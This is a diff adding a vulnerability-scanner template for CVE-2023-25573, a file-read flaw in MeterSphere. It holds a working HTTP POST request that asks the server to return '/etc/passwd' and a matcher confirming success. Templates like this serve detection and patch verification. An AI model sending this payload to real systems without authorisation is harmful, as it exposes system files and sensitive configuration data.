@@ -1,0 +1,34 @@
+id: cve-2023-25573
+
+info:
+  name: MeterSphere /api/jmeter/download/files Path File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    MeterSphere is a one-stop open source continuous testing platform. This vulnerability allows attackers to read system files like database configurations, exposing sensitive data.
+  reference:
+    - https://github.com/metersphere/metersphere/security/advisories/GHSA-mcwr-j9vm-5g8h
+  classification:
+    cvss-score: 7.5
+    cve-id: CVE-2023-25573
+  tags: file-read
+
+variables:
+  file_path: "/etc/passwd"
+
+http:
+  - raw:
+      - |
+        POST /api/jmeter/download/files HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"reportId":"d51D8b","bodyFiles":[{"id":"aaa","name":"{{file_path}}"}]}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
